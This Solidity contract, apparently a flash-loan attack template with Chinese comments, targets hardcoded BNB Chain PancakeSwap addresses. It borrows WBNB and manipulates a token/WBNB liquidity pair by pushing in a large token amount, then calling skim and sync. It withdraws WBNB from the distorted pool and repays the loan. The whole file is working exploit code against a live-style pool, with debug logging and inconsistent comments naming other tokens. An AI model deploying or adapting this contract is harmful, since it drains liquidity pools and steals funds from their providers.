// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;


import "./console.sol";
import "./IUniswapV2pair.sol";
import "./IERC20.sol";


contract flashloan_template{
    //配对合约的地址，要从路由上的该 pair 对中用 WETH 兑换出 USDT, 每个要用到的 token 地址
    address public constant BUSD_WBNB = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
    address public constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public constant BUSD = 0x55d398326f99059fF775485246999027B3197955;

    address public constant token = 0xAf93908f5F8D66B50E11d7dE06f688DdE373C0cC;
    address public constant LP_token = 0x54f227fe27Ac93d3e1C09B443f03e5e929ee5259;

    // 路由地址，使用哪个路由进行 token 的兑换
    address public uniswapv2router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;            //pancake
    address public biswapRouter = 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F;               //sushi
    address public pancake_usdt_wbnb = 0x20bCC3b8a0091dDac2d0BC30F68E6CBb97de59Cd;

    uint256 constant fee = 2;

    uint256 borrowAmount;       //全局变量，可以方便知道初始借了多少 token
    uint256 originalETH;        //全局变量，存入 WETH 的数量，方便计算最后的差额

    receive() external payable {}

    //给路由合约授权能操作的代币数量
    function set_approve_token() public{
        IERC20(BUSD).approve(uniswapv2router, type(uint).max);
        IERC20(WBNB).approve(uniswapv2router, type(uint).max);

        IERC20(BUSD).approve(biswapRouter, type(uint).max);
        IERC20(WBNB).approve(biswapRouter, type(uint).max);

    }

    //开始闪电兑换： WETH--USDT--USDC-->WETH
    function flashloan_from_DDAP() public{
        console.log("start flash loan...");

        (uint256 reserve0, uint256 reserve1, ) = UniswapV2Pair(BUSD_WBNB).getReserves();
        console.log("BUSD_WBNB pair pool first reserve0 and reserve1 : ", reserve0, reserve1);

        bytes memory data = bytes("flashloan");
        uint256 borrowAmount0 = 0;
        uint256 borrowAmount1 = 2500 * 10 ** 18;
        //第一步：兑换出期望数量的USDT
        borrowAmount = borrowAmount1;

        UniswapV2Pair(BUSD_WBNB).swap(borrowAmount0, borrowAmount1, address(this), data);           //borrowAmount0 - busd
    }

    //实现闪电兑换逻辑
    function pancakeCall(address _account, uint256 _amount0, uint256 _amount1, bytes memory _data) public{
        
        console.log("now I have WBNB: ", IERC20(WBNB).balanceOf(address(this)));
        // console.log("flashloan logical ways...");

        // uint256 transfer_WBNB = IERC20(WBNB).balanceOf(address(this));
        (uint256 reserve0, uint256 reserve1, ) = UniswapV2Pair(LP_token).getReserves();
        console.log("1xxxxxx MON_WBNB_pair reserve0 and reserve1 : ", reserve0, reserve1);          //deposit r1 to swap r0

        IERC20(WBNB).transfer(LP_token, IERC20(WBNB).balanceOf(address(this)));
        uint256 pair_remain_BNB = IERC20(WBNB).balanceOf(LP_token);
        console.log("Then transfer WBNB to pancake pair...", IERC20(WBNB).balanceOf(LP_token));
        
        uint256 amount0Out = (reserve0 - (reserve0 * reserve1 / pair_remain_BNB)) * 98/100;     // 100 / (100 + fee) get amount out of the pool, if WBNB is reserve1 ,swap reserve0
        console.log("2xxxxxxxxxxxxx amount0Out :",amount0Out);
        uint256 amount1Out = 0;
        bytes memory data = "";
        UniswapV2Pair(LP_token).swap(amount0Out, amount1Out, address(this), data);
        console.log("now I have swaped tokens out: ", IERC20(token).balanceOf(address(this)));
        (uint256 r0, uint256 r1,) = UniswapV2Pair(LP_token).getReserves();
        console.log("2xxxxxxxxxxxxx after I swap, the pool remains: ", r0, r1);        //check the pool

        
        uint256 transfer_amount2 = IERC20(token).balanceOf(LP_token) * 49;                            //transfer coin to pool
        IERC20(token).transfer(LP_token, transfer_amount2);
        console.log("Transfer MON to pancake pair... I still have", IERC20(token).balanceOf(address(this)));

        //skim
        console.log("3xxxxxxx pancake skim to me...");
        (uint256 skim0, uint256 skim1, ) = UniswapV2Pair(LP_token).getReserves();
        console.log("3xxxxxxx MON_WBNB_pair reserve0 and reserve1 : ", skim0, skim1);
        UniswapV2Pair(LP_token).skim(address(this));
        UniswapV2Pair(LP_token).sync();
        (uint256 sync0, uint256 sync1, ) = UniswapV2Pair(LP_token).getReserves();
        console.log("3xxxxxxx -------------after sync MON_WBNB_pair reserve0 and reserve1 : ", sync0, sync1);
        console.log(" ---------------------after skim now I have WDoge: ", IERC20(token).balanceOf(address(this)));
        // console.log("-------------after skim now I have WBNB: ", IERC20(WBNB).balanceOf(address(this)));
        console.log("----------------------first sync complete...");


        (uint256 reserve01, uint256 reserve11, ) = UniswapV2Pair(LP_token).getReserves();
        console.log("4xxxxxx MON_WBNB_pair reserve0 and reserve1 : ", reserve01, reserve11);
        // console.log("4xxxxxx now I have WDoge: ", IERC20(MON).balanceOf(address(this)));
        uint256 draw = IERC20(token).balanceOf(address(this)) * 98/100;                                       //tranfer fee
        IERC20(token).transfer(LP_token, draw);
        uint256 pair_remain = IERC20(token).balanceOf(LP_token);
        
        // (uint256 real1,,) = UniswapV2Pair(MON_WBNB_pair).getReserves();
        // uint256 sub_num1 = real1 - reserve01;
        // uint256 sub_num2 = real2 - reserve11;
        // uint256 draw_token = (reserve01 - reserve01 * reserve11 / (reserve11 + sub_num1)) * 95 / 100;      //swap r1
        // uint256 draw_wbnb = IERC20(WBNB).balanceOf(LP_token) * 999999/1000000;
        uint256 draw_wbnb = (reserve11 - (reserve01 * reserve11) / pair_remain) * 9997/10000;        //
        console.log("5xxxxxxx draw_amount is ", draw_wbnb);
        uint256 _amount0Out = 0;
        uint256 _amount1Out = draw_wbnb;
        bytes memory _data1 = "";
        UniswapV2Pair(LP_token).swap(_amount0Out, _amount1Out, address(this), _data1);
        console.log("6xxxxxxxx finally I got WBNB......begin to return money", IERC20(WBNB).balanceOf(address(this)));

        //return money
        //路由合约计算对价，给输出，算输入  ****************************
        address[] memory path3 = new address[](2);
        path3[0] = BUSD;
        path3[1] = WBNB;
        uint[] memory amounts3 = UniswapV2Pair(uniswapv2router).getAmountsIn(borrowAmount, path3);      //借了 USDT ，需要还 WETH
        console.log("7xxxxxxxx I have to return the other money", amounts3[0], amounts3[1]);

        console.log("WBNB_to_BUSD swap in other swapRouter...");
        
        // uint amountIn = IERC20(WBNB).balanceOf(address(this));
        // (uint256 return0, uint256 return1, ) = UniswapV2Pair(pancake_usdt_wbnb).getReserves();
        // console.log("8xxxxxxxx final pancake_usdt_wbnb returns pool: ", return0, return1);
        uint amountIn = IERC20(WBNB).balanceOf(address(this));
        uint amountOutMin = 0;
        address[] memory path1 = new address[](2);
        path1[0] = WBNB;
        path1[1] = BUSD;

        UniswapV2Pair(biswapRouter).swapExactTokensForTokens(amountIn, amountOutMin, path1, address(this), block.timestamp);
        uint256 swap_BUSD = IERC20(BUSD).balanceOf(address(this));
        console.log("now I have BUSD: ", swap_BUSD);

        // if(amounts3[0] > swap_BUSD){
        //     console.log("not have enough money to return flashloan....!!!!!!");
        //     revert();
        // }
        //第四步，向 pair 对归还当初借出的 WETH
        IERC20(BUSD).transfer(BUSD_WBNB, swap_BUSD);       //不能写 amounts2[1]，因为 amounts2[1] 少于当初借的钱

    }

}